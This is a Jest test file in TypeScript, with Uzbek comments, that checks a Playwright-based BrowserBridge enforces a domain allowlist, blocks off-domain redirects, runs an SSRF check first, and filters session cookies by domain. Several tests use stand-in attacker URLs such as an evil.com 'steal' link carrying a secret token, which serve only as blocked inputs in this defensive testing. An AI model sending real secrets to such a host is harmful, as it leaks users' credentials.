/**
 * SEC-07 — BrowserBridge integratsiyasi (P0-3 §14).
 *
 * Bu yerda `domain-allowlist.ts` ning SOF mantig'i qayta tekshirilmaydi
 * (u `domain-allowlist.spec.ts` da) — bu fayl faqat ULANISHNI tekshiradi:
 * navigate bloki, route() ilgagi (redirect), sessiya filtri va
 * majburlashni o'chirish.
 */

import { BrowserBridge, DomainBlockEvent } from './browser-bridge';

// SSRF filtri haqiqiy DNS so'rovi qiladi — testda uni mock qilamiz.
// `null` = SSRF ruxsat berdi, ya'ni keyingi (SEC-07) filtr sinaladi.
jest.mock('../common/ssrf', () => ({
  urlBlockedReason: jest.fn().mockResolvedValue(null),
}));

// Haqiqiy Chromium ishga tushirilmaydi — bizni faqat `newContext` ga
// uzatilgan argumentlar va `route()` ilgagi qiziqtiradi.
jest.mock('playwright', () => ({
  chromium: { launch: jest.fn() },
}));

import { urlBlockedReason } from '../common/ssrf';

/** `execute()` uchun minimal Page mock'i. */
function mockPage(currentUrl = 'about:blank') {
  let url = currentUrl;
  return {
    goto: jest.fn(async (target: string) => {
      url = target;
    }),
    url: () => url,
    title: jest.fn().mockResolvedValue('Title'),
    waitForLoadState: jest.fn().mockResolvedValue(undefined),
    locator: jest.fn(),
  };
}

function bridgeWithPage(
  options: ConstructorParameters<typeof BrowserBridge>[0],
  page = mockPage(),
) {
  const bridge = new BrowserBridge(options);
  (bridge as unknown as { page: unknown }).page = page;
  return { bridge, page };
}

beforeEach(() => {
  (urlBlockedReason as jest.Mock).mockResolvedValue(null);
  jest.clearAllMocks();
});

describe('navigate — SEC-07 bloki', () => {
  it('ruxsat etilmagan domenga o‘tmaydi va sahifa URL‘i O‘ZGARMAYDI', async () => {
    const { bridge, page } = bridgeWithPage({ allowedDomains: ['example.com'] });

    const result = await bridge.execute({ action: 'navigate', url: 'https://evil.com/x' });

    expect(result).toMatch(/^ERROR:/);
    expect(result).toContain('not in allowlist');
    expect(page.goto).not.toHaveBeenCalled();
    expect(page.url()).toBe('about:blank'); // holat o‘zgarmadi
  });

  it('ruxsat etilgan domenga o‘tadi', async () => {
    const { bridge, page } = bridgeWithPage({ allowedDomains: ['example.com'] });

    const result = await bridge.execute({ action: 'navigate', url: 'https://example.com/x' });

    expect(result).not.toMatch(/^ERROR:/);
    expect(page.goto).toHaveBeenCalledWith('https://example.com/x', expect.any(Object));
  });

  it('ruxsat etilgan domenning SUBDOMAIN‘iga o‘tadi', async () => {
    const { bridge, page } = bridgeWithPage({ allowedDomains: ['example.com'] });
    await bridge.execute({ action: 'navigate', url: 'https://shop.example.com/' });
    expect(page.goto).toHaveBeenCalled();
  });

  it('⚠️ FAIL-CLOSED: allowlist bo‘sh bo‘lsa HAR QANDAY URL bloklanadi', async () => {
    const { bridge, page } = bridgeWithPage({ allowedDomains: [] });

    for (const url of ['https://example.com', 'https://google.com', 'http://anything.dev']) {
      const result = await bridge.execute({ action: 'navigate', url });
      expect(result).toMatch(/^ERROR:/);
      expect(result).toContain('fail-closed');
    }
    expect(page.goto).not.toHaveBeenCalled();
  });

  it('SSRF filtri SEC-07 dan OLDIN ishlaydi va allowlist uni bekor QILMAYDI', async () => {
    (urlBlockedReason as jest.Mock).mockResolvedValue('internal/reserved address blocked');
    // `localhost` allowlist‘da bo‘lsa ham — SSRF baribir bloklaydi.
    const { bridge, page } = bridgeWithPage({ allowedDomains: ['localhost'] });

    const result = await bridge.execute({ action: 'navigate', url: 'http://localhost:5432' });

    expect(result).toContain('internal/reserved address blocked');
    expect(page.goto).not.toHaveBeenCalled();
  });

  it('majburlash o‘chirilgan bo‘lsa domen tekshirilmaydi', async () => {
    const { bridge, page } = bridgeWithPage({
      allowedDomains: [],
      enforceDomainAllowlist: false,
    });

    const result = await bridge.execute({ action: 'navigate', url: 'https://anything.dev' });

    expect(result).not.toMatch(/^ERROR:/);
    expect(page.goto).toHaveBeenCalled();
  });
});

describe('onBlocked — audit hodisasi', () => {
  it('blok uchun chaqiriladi va TO‘LIQ URL emas, faqat HOST beradi', async () => {
    const blocked: DomainBlockEvent[] = [];
    const { bridge } = bridgeWithPage({
      allowedDomains: ['example.com'],
      onBlocked: (e) => blocked.push(e),
    });

    await bridge.execute({ action: 'navigate', url: 'https://evil.com/steal?token=SECRET123' });

    expect(blocked).toHaveLength(1);
    expect(blocked[0].host).toBe('evil.com');
    expect(blocked[0].source).toBe('navigate');
    // Sir query‘da edi — hodisaga tushmasligi SHART.
    expect(JSON.stringify(blocked[0])).not.toContain('SECRET123');
  });

  it('ruxsat etilgan navigatsiyada chaqirilmaydi', async () => {
    const onBlocked = jest.fn();
    const { bridge } = bridgeWithPage({ allowedDomains: ['example.com'], onBlocked });
    await bridge.execute({ action: 'navigate', url: 'https://example.com' });
    expect(onBlocked).not.toHaveBeenCalled();
  });

  it('callback xatosi brauzer ijrosini YIQITMAYDI', async () => {
    const { bridge } = bridgeWithPage({
      allowedDomains: ['example.com'],
      onBlocked: () => {
        throw new Error('audit DB down');
      },
    });

    const result = await bridge.execute({ action: 'navigate', url: 'https://evil.com' });

    // Xato yutildi, planner baribir aniq sabab oldi.
    expect(result).toMatch(/^ERROR:/);
    expect(result).toContain('not in allowlist');
  });
});

describe('route() ilgagi — redirect va sahifa-ichi navigatsiya', () => {
  /** `open()` o‘rnatgan route handler‘ini ushlab oladi. */
  async function captureRouteHandler(options: ConstructorParameters<typeof BrowserBridge>[0]) {
    let handler!: (route: unknown) => Promise<unknown>;
    const context = {
      route: jest.fn(async (_pattern: string, fn: (route: unknown) => Promise<unknown>) => {
        handler = fn;
      }),
      newPage: jest.fn().mockResolvedValue(mockPage()),
    };
    const browser = { newContext: jest.fn().mockResolvedValue(context), close: jest.fn() };
    const playwright = jest.requireMock('playwright');
    playwright.chromium.launch.mockResolvedValue(browser);

    const bridge = new BrowserBridge(options);
    await bridge.open();
    return { handler, context };
  }

  function fakeRoute(url: string, isNavigation = true) {
    return {
      request: () => ({
        url: () => url,
        resourceType: () => 'document',
        isNavigationRequest: () => isNavigation,
      }),
      abort: jest.fn().mockResolvedValue(undefined),
      continue: jest.fn().mockResolvedValue(undefined),
    };
  }

  it('⚠️ ruxsat etilgan domendan TASHQARIGA redirect bloklanadi', async () => {
    const blocked: DomainBlockEvent[] = [];
    const { handler } = await captureRouteHandler({
      allowedDomains: ['example.com'],
      onBlocked: (e) => blocked.push(e),
    });

    const route = fakeRoute('https://evil.com/landed-after-302');
    await handler(route);

    expect(route.abort).toHaveBeenCalledWith('blockedbyclient');
    expect(route.continue).not.toHaveBeenCalled();
    expect(blocked[0]?.source).toBe('route');
  });

  it('ruxsat etilgan domen o‘tkaziladi', async () => {
    const { handler } = await captureRouteHandler({ allowedDomains: ['example.com'] });
    const route = fakeRoute('https://example.com/page');
    await handler(route);
    expect(route.continue).toHaveBeenCalled();
    expect(route.abort).not.toHaveBeenCalled();
  });

  it('about:blank bloklanmaydi (Playwright boshlang‘ich sahifasi)', async () => {
    const { handler } = await captureRouteHandler({ allowedDomains: ['example.com'] });
    const route = fakeRoute('about:blank');
    await handler(route);
    expect(route.continue).toHaveBeenCalled();
  });
});

describe('open() — sessiya filtri (SEC-07 AC)', () => {
  async function openWith(
    options: ConstructorParameters<typeof BrowserBridge>[0],
    storageState: Parameters<BrowserBridge['open']>[0],
  ) {
    const context = {
      route: jest.fn().mockResolvedValue(undefined),
      newPage: jest.fn().mockResolvedValue(mockPage()),
    };
    const browser = { newContext: jest.fn().mockResolvedValue(context), close: jest.fn() };
    const playwright = jest.requireMock('playwright');
    playwright.chromium.launch.mockResolvedValue(browser);

    const bridge = new BrowserBridge(options);
    await bridge.open(storageState);
    return browser.newContext.mock.calls[0][0];
  }

  const state = {
    cookies: [
      { name: 'shop', domain: 'example.com', path: '/' },
      { name: 'gmail', domain: 'mail.google.com', path: '/' },
    ],
    origins: [],
  };

  it('⚠️ kontekstga FAQAT allowlist cookie‘lari in’ektsiya qilinadi', async () => {
    const opts = await openWith({ allowedDomains: ['example.com'] }, state);
    const names = (opts.storageState?.cookies ?? []).map((c: { name: string }) => c.name);
    expect(names).toEqual(['shop']);
    expect(names).not.toContain('gmail');
  });

  it('mos sessiya bo‘lmasa kontekst login‘siz ochiladi (run to‘xtamaydi)', async () => {
    const opts = await openWith({ allowedDomains: ['nothing.dev'] }, state);
    expect(opts.storageState).toBeUndefined();
  });

  it('majburlash o‘chirilgan bo‘lsa sessiya filtrlanmaydi', async () => {
    const opts = await openWith(
      { allowedDomains: [], enforceDomainAllowlist: false },
      state,
    );
    expect(opts.storageState).toBe(state);
  });
});
